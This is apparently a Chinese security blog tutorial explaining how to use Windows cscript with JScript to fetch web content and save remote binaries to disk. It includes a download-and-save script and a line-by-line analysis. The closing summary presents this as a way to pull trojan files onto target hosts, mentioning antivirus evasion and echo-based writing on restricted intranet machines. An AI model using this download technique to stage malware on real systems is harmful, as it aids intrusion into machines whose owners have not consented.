## 0x00 前言

**windows所有版本，都默认支持javascript，我们可以通过调用cscript命令来达到读写文件的目的。**

`cscript.exe` 是 Windows脚本宿主的一个exe文件，可以用来从命令行运行`js`脚本。所属程序为Win32控制台程序。所以在Linux主机中，并没有`cscript`，同时，无论是哪个版本的windows系列,都是支持vbs的。

## 0x01 js脚本

### 读取文件

```
 cscript /nologo download.js http://www.baidu.com/robots.txt
```

![](../Images/c0273b20d519b8a5e91f0a559b551cfd.png)

其中，`nologo`的含义是，在运行时不显示执行标题。**执行标题是什么鬼？**我们分别用`/nologo`和`/logo`来运行查看即可。

原来执行标题就是下图这个，我们熟悉又陌生的东西。**我们往往看不到自己的鼻子，因为我们的眼睛已经学会了忽视它。**（升华了升华了）

![](../Images/1205d14ee9b270151ef25543ff8ba59e.png)

源码如下：

```
 var WinHttpReq \= new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /\*async=\*/false);
WinHttpReq.Send();
WScript.Echo(WinHttpReq.ResponseText);
```

### 下载文件

```
 cscript /nologo push.js http://www.baidu.com/robots.txt
```

![](../Images/d4c6744ac276223ab28c20725b62e91d.png)

`push.js`源码如下：

```
 var WinHttpReq \= new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /\*async=\*/false);
WinHttpReq.Send();
BinStream \= new ActiveXObject("ADODB.Stream");
BinStream.Type \= 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile("hello.exe");  
//记得更改括号中你要保存的文件名称与类型
```

  

## 0x02 代码分析

> 下面这段代码是**我个人的理解与分析**，有错误请多多指正。大佬们轻喷。

### js脚本读取文件

第一行代码分析：本着变量声明见名知意的原则，用var声明了`WinHttpReq`变量来表示`WinHttp`的`request`数据。这个`ActiveX`是：

> ActiveX 控件广泛用于  Internet。它们可以通过提供视频、动画内容等来增加浏览的乐趣。不过，这些程序可能出问题或者向您提供不需要的内容。在某些情况下，这些程序可被用来以您不允许的方式从计算机收集信息、破坏您的计算机上的数据、在未经您同意的情况下在您的计算机上安装软件或者允许他人远程控制您的计算机。考虑到这些风险，您应该在完全信任发行商的情况下才安装这些程序。

新建一个`ActiveXObject`对象，这个`ActiveXOject`对象将返回一个js的`Automation`对象，简单理解就是从`WinHttp.WinHttpRequest.5.1`这个模板中，创建了一个这个对象，具有Request的功能。

`WinHTTP`的全称是`Microsoft Windows HTTP Services` 它提供给开发者一个HTTP客户端应用程序接口(API)， 通过这种API借助HTTP协议给其他的HTTP服务器发送请求。总之就是它可以发起一个http请求就是了。所以不难理解，`WinHttp.WinHttpRequest.5.1`是HTTP客户端的request请求。

```
 var WinHttpReq \= new ActiveXObject("WinHttp.WinHttpRequest.5.1");
```

第二行代码的`open`函数我们很熟悉了，还记得AJAX怎么发起的请求么？就是利用的是JS中的**XMLHttpRequest对象的open()和send()方法**：

| 方法 || 描述 |
| --- | --- |
| open(method,url,async) || 规定请求的类型、URL、以及是否异步处理请求method：请求的类型；GET或者POSTURL：文件在服务器上的位置async：true（异步） false（同步） |
| --- | --- |
| send(string) || 将请求发送到服务器string:仅仅用于POST请求 |

所以结合上面的表格来分析，第二行代码（如下），发起`GET`请求了`WScript.Arguments(0)`，使用同步的方式。**注意这里的GET请求返回http的响应数据，不但包括文本，还包括二进制数据。**`WScript.Arguments(0)`是啥？`wscript`是`vbs`中的一个对象，而`wscript`下的`arguments`是`vbs`中的一个参数集合（参数的英语就是arguments，很好理解），`wscript.arguments(0)`就是这个集合中的下标为0即第一个参数，就类似于数组，下标为0时，取第一个键对应的值。

```
 var WinHttpReq \= new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /\*async=\*/false);
```

继续分析第三行代码，结合上面的表格就好理解了。`send(string)`中的`string`仅仅用于POST请求，这里是GET，所以用不到，直接空着。将上面定好的GET请求，发送到服务端。

```
 var WinHttpReq \= new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /\*async=\*/false);
WinHttpReq.Send();
```

那么最后一行代码，就是输出响应的内容到终端。

```
 var WinHttpReq \= new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /\*async=\*/false);
WinHttpReq.Send();
WScript.Echo(WinHttpReq.ResponseText);
```

  

### 写入文件代码分析

有了前面的理解，写入文件这里只分析后面的4-8行哈。先来看一下4-5行。新建了一个`ADODB.Stream`对象赋予给`BinStream`变量，来表示二进制数据流。

`ADODB.Stream`是一个组件，简单理解就是处理数据的方法的一个集合对象。

这个`ADODB.Stream`中的`Type`方法，1表示二进制数据流，2表示的是`text`文本。所以第5行的意思是定义数据流的类型为二进制数据流。

```
 var WinHttpReq \= new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /\*async=\*/false);
WinHttpReq.Send();
BinStream \= new ActiveXObject("ADODB.Stream");
BinStream.Type \= 1;
```

继续分析下面的第6-8行代码，就是发起GET请求，然后写入到`WinHttpReq`对象的一个集合中，最后使用`SaveToFile`方法写入一个文件，而这个文件我们可以自定义任意的后缀，**这就是我们要让目标返回二进制数据流的原因，因为二进制数据可以被转化为任意的数据类型。我这里是hello.exe，可以任意更改。**

```
 var WinHttpReq \= new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /\*async=\*/false);
WinHttpReq.Send();
BinStream \= new ActiveXObject("ADODB.Stream");
BinStream.Type \= 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile("hello.exe");
```

  

## 0x03 关键点总结

1、无论是windows哪个版本，都默认支持`javascript`，好比windows默认支持`vbs`脚本一样。**Linux主机无。**

2、无论是读写文件，都是用`cscript.exe`程序实现的`js`代码解析，其中的`/nologo`即去掉运行标题，排除可能干扰结果的无用之处。

3、若通过其下载木马文件，需要对木马文件进行免杀。

4、在一些内网环境中，往往无法上传这样的`js`脚本时，**可以通过`echo`来一句句写入文件，注意有些符号需要转义。**

5、代码分析中的关键程序的`cscript.exe`、`wscript.exe`，都在`C:\windows\system32`目录下面。
